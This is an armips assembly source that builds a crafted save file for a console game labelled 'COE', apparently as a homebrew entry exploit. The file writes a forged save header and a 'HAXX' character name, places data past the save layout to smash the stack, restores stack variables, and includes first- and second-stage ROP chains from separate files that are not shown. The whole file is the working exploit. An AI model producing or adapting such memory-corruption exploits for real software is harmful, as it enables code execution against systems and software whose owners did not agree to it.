.nds

.loadtable "coe_save/unicode.tbl"

.include "coe_save/coe_constants.s"
.include "coe_save/coe_macros.s"

.create COE_SAVE_OUT,COE_COPYTO_ADDR

; Save header
.orga 0x0
    .word (save_end - .) ; total save size
.area 0xE,0
    .ascii COE_SAVE_PATH ; "previous" save file that this save inherited from
.endarea
    .halfword 0x3334
    .word 0x000E000C
    .word 0xF8E80022
    .word 0x33333333
    .word 0x00333333

; Character name
.area 0x1C,0
    .string "HAXX"
.endarea

    .word 0xFFFF0000
    .word 0x0111EEEF
    .word 0x0000C98E
    .word 0x00011500

; Skip some save parsing
.orga 0x1168
    .word 0xFFFFFFFF

; Save slot data replacements in order to clear function after stack smash
.orga 0x1800
save_path:
    .ascii COE_SAVE_PATH,0 ; SaveData1.xml, SaveData2.xml, SaveData3.xml, Autosave.xml
save_name:
    .ascii COE_SAVE_NAME,0 ; 1, 2, 3, Autosave

; Second stage ROP
.orga 0x2000
    .incbin "build/rop.bin"

; Restore some stack variables in order to clear the function
.orga 0xFE54
    .word COE_SAVE_OBJECT
    .word save_path
    .word save_name

; First stage ROP
.orga 0xFE88
    .include "coe_save/coe_payload.s"

save_end:
.close
